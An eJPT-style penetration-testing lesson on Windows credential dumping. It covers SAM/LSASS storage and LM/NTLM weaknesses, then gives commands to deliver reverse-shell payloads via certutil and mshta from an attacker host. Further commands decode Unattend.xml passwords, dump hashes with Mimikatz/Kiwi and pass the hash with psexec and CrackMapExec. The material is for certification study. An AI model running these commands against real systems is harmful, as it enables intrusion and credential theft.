# Windows Credential Dumping

This lesson covers how Windows stores passwords, how attackers extract them, and how they use captured credentials to move laterally — all critical techniques for the eJPT.

> ⚠️ **Note**: All techniques require an **elevated/administrative Meterpreter session** on the target. Replace IPs and values with your actual ones.

---

## How Windows Stores Passwords

### The SAM Database

The **SAM (Security Accounts Manager)** database stores all local user account password hashes on Windows. Key facts:

- The SAM file is located at `C:\Windows\System32\config\SAM`.
- It **cannot be copied while Windows is running** — the NT kernel keeps it locked.
- In modern Windows versions, the SAM database is **encrypted with a syskey**.
- Attackers use **in-memory techniques** to dump hashes from the **LSASS process** instead of directly accessing the file.
- Authentication and verification of credentials is managed by **LSA (Local Security Authority)**, which runs as the `lsass.exe` process.

> ⚠️ You need an **elevated/admin session** to dump hashes from SAM or LSASS.

### Hash Types

| Hash Type | Used In | Algorithm | Weaknesses |
|-----------|---------|-----------|-----------|
| **LM (LanMan)** | Windows XP and earlier / Server 2003 | DES | No salt, splits password into two 7-char chunks, converts to uppercase — easily cracked with rainbow tables |
| **NTLM** | Windows Vista onwards | MD4 | No salt — brute-force and rainbow table attacks still effective, but stronger than LM |

**LM hashing process** (why it's weak):
1. Password split into two **7-character chunks**.
2. All characters converted to **uppercase** (halves the keyspace).
3. Each chunk hashed **separately** with DES.
4. No salt — identical passwords always produce identical hashes.

**NTLM improvements over LM**:
- Does **not** split the hash.
- Is **case sensitive**.
- Supports **symbols and Unicode characters**.
- Still has **no salt** — rainbow tables and brute-force remain viable.

---

## 1. Searching for Passwords in Configuration Files

### What are Unattended Installation Files?

Windows can automate mass OS deployments using the **Unattended Windows Setup** utility. It uses configuration files containing system settings and — critically — **the Administrator account password**.

If these files are left on the system after installation, attackers can read the Administrator credentials directly.

**Common file locations**:

```
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Autounattend.xml
```

Passwords may be stored in **Base64 encoding** (not encrypted — just encoded, trivially reversible).

### Step 1: Deliver and Execute a Payload

Generate a payload on Kali:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<your_ip> \
  LPORT=1234 \
  -f exe > payload.exe
```

Host it with a Python web server:

```bash
python3 -m http.server 80
```

Download it on the target via the command prompt:

```cmd
certutil -urlcache -f http://<your_ip>/payload.exe payload.exe
payload.exe
```

### Step 2: Set Up the Listener

```bash
msfconsole
msf6 > use multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST <your_ip>
msf6 > set LPORT 1234
msf6 > exploit -j
```

### Step 3: Find the Unattend.xml File

Once you have a Meterpreter session, search for the file:

```bash
meterpreter > search -f Unattend.xml
meterpreter > download C:\\Windows\\Panther\\Unattend.xml
```

### Step 4: Decode the Base64 Password

**On Kali** (Linux):

```bash
# Extract the Base64 password from the file and decode it
echo "QWRtaW5AMTIz" | base64 -d
```

**On the target** (PowerShell):

```powershell
$password = 'QWRtaW5AMTIz'
$password = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
echo $password
```

### Step 5: Use the Credentials

**Option A — Open admin cmd on target**:

```cmd
runas.exe /user:administrator cmd
```

**Option B — Get Meterpreter shell via hta_server**:

```bash
msf6 > use exploit/windows/misc/hta_server
msf6 > set LHOST <your_ip>
msf6 > exploit
# Copy the generated URL, then on target:
mshta.exe http://<your_ip>:<port>/payload.hta
```

### Step 6: Find Config Files with PowerSploit (Alternative)

If you already have a session, use **PowerUp** from PowerSploit to audit for privilege escalation paths including unattended files:

```powershell
cd C:\Users\<user>\Desktop\PowerSploit\Privesc\
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
```

PowerUp will flag `Unattend.xml` if found and show the encoded password.

---

## 2. Dumping Hashes with Mimikatz / Kiwi

### What is Mimikatz?

**Mimikatz** is a powerful Windows post-exploitation tool that extracts:
- **Cleartext passwords** (if WDigest is enabled)
- **NTLM hashes**
- **Kerberos tickets**

All from the **`lsass.exe` process memory**, where Windows caches credentials.

**Kiwi** is the Metasploit/Meterpreter port of Mimikatz — same functionality, built into your session.

> You need to **migrate to a 64-bit process** and have **SYSTEM privileges** before dumping.

### Method A: Kiwi (via Meterpreter)

#### Step 1: Gain an Admin Meterpreter Session

Exploit a service (e.g., BadBlue on port 80):

```bash
msfconsole
msf6 > use exploit/windows/http/badblue_passthru
msf6 > set RHOSTS <target_ip>
msf6 > set LHOST <your_ip>
msf6 > exploit
```

#### Step 2: Migrate to LSASS

```bash
meterpreter > pgrep lsass
meterpreter > migrate <lsass_pid>
```

Migrating to `lsass.exe` gives you the highest privileges on the system (`NT AUTHORITY\SYSTEM`).

#### Step 3: Load Kiwi and Dump Credentials

```bash
meterpreter > load kiwi

# Dump all credentials (cleartext + hashes + Kerberos tickets)
meterpreter > creds_all

# Dump SAM database hashes only
meterpreter > lsa_dump_sam

# Dump LSA secrets (service account passwords, cached domain credentials)
meterpreter > lsa_dump_secrets
```

### Method B: Mimikatz Executable (via Shell)

If you prefer to use the standalone Mimikatz binary:

#### Step 1: Upload Mimikatz to Target

```bash
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\Users\\admin\\AppData\\Local\\Temp\\mimikatz.exe
meterpreter > shell
```

#### Step 2: Run Mimikatz

```cmd
C:\> C:\Users\admin\AppData\Local\Temp\mimikatz.exe
```

#### Step 3: Enable Debug Privileges

```
mimikatz # privilege::debug
```

Output: `Privilege '20' OK` — confirms you have the required debug privilege.

#### Step 4: Dump Credentials

```
# Dump SAM database (local user NTLM hashes)
mimikatz # lsadump::sam

# Dump LSA secrets (cached domain credentials, service accounts)
mimikatz # lsadump::secrets

# Dump cleartext passwords from memory (requires WDigest enabled)
mimikatz # sekurlsa::logonpasswords
```

### Kiwi vs Mimikatz Comparison

| Feature | Kiwi (Meterpreter) | Mimikatz (Executable) |
|---------|-------------------|----------------------|
| **Setup** | `load kiwi` — instant | Upload binary, drop to shell |
| **Detection risk** | Lower (runs in memory) | Higher (binary on disk) |
| **Cleartext passwords** | `creds_all` | `sekurlsa::logonpasswords` |
| **SAM hashes** | `lsa_dump_sam` | `lsadump::sam` |
| **LSA secrets** | `lsa_dump_secrets` | `lsadump::secrets` |

### Quick Hash Dump (Meterpreter)

If you only need NTLM hashes quickly:

```bash
meterpreter > hashdump
```

Output format: `username:uid:LM_hash:NTLM_hash:::`

Example:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```
- First 32 chars after `:500:` = **LM hash** (usually empty/default on modern Windows)
- Last 32 chars = **NTLM hash** (what you need for Pass-the-Hash)

---

## 3. Pass-the-Hash (PTH) Attacks

### What is Pass-the-Hash?

**Pass-the-Hash** is a lateral movement technique where you use a captured **NTLM hash directly** to authenticate — without ever cracking or knowing the plaintext password. Windows NTLM authentication accepts the hash itself as proof of identity.

**Why it works**: NTLM authentication is challenge-response based. The hash is used to encrypt a challenge from the server — so if you have the hash, you can respond correctly without knowing the password.

### Method A: PsExec Module (Metasploit)

```bash
msfconsole
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS <target_ip>
msf6 > set SMBUser administrator
msf6 > set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST <your_ip>
msf6 > exploit
```

`SMBPass` format: `LM_hash:NTLM_hash`

If you only have the NTLM hash, use the default empty LM hash:
```
aad3b435b51404eeaad3b435b51404ee:<your_NTLM_hash>
```

### Method B: CrackMapExec

CrackMapExec is faster for testing credentials across multiple targets:

```bash
# Authenticate and run a command with PTH
crackmapexec smb <target_ip> -u administrator -H "8846f7eaee8fb117ad06bdd830b7586c" -x "whoami"

# Test across a whole subnet
crackmapexec smb 192.168.1.0/24 -u administrator -H "8846f7eaee8fb117ad06bdd830b7586c"
```

Successful authentication shows `(Pwn3d!)` in the output.

**Flags**:
- `-u`: Username
- `-H`: NTLM hash (LM hash not required)
- `-x`: Command to execute on the target

---

## Complete Attack Chain

```
Exploit Service → Meterpreter Session → Migrate to LSASS → Dump Hashes → Pass-the-Hash → New Session
```

| Step | Action | Tool |
|------|--------|------|
| **1** | Exploit vulnerable service | Metasploit |
| **2** | Gain Meterpreter session | Metasploit |
| **3** | Migrate to `lsass.exe` | `migrate <pid>` |
| **4** | Dump hashes | Kiwi / Mimikatz / `hashdump` |
| **5** | Use hashes for lateral movement | PsExec / CrackMapExec |

---

## Key Takeaways

- **SAM database** stores local user NTLM hashes — locked by the kernel while Windows runs, accessed via LSASS in-memory.
- **LM hashes** are weak — no salt, splits password into two 7-char uppercase chunks. Only on Windows XP/Server 2003 and earlier.
- **NTLM hashes** are used from Vista onwards — stronger than LM but still vulnerable to brute-force and rainbow tables (no salt).
- **Unattend.xml** files left after automated Windows installations may contain the Administrator password in **Base64 encoding** — trivially reversible.
- Look for `Unattend.xml` at `C:\Windows\Panther\` — use `search -f` in Meterpreter or `Invoke-PrivescAudit` with PowerUp.
- **Mimikatz / Kiwi** extract hashes and cleartext passwords from `lsass.exe` memory — migrate to LSASS first for SYSTEM privileges.
- **`privilege::debug`** must be run in Mimikatz before dumping — confirms debug privileges are active.
- **`sekurlsa::logonpasswords`** dumps cleartext passwords — only works if WDigest authentication is enabled on the target.
- **`hashdump`** in Meterpreter quickly dumps all local NTLM hashes — format is `user:uid:LM:NTLM:::`.
- **Pass-the-Hash** uses captured NTLM hashes directly for authentication — no password cracking needed.
- **PsExec** (`exploit/windows/smb/psexec`) accepts `LM_hash:NTLM_hash` in `SMBPass`.
- **CrackMapExec** tests PTH across multiple targets simultaneously — `(Pwn3d!)` confirms successful auth.
- Always **migrate to a 64-bit stable process** (like `lsass.exe` or `explorer.exe`) before running credential dumping tools.
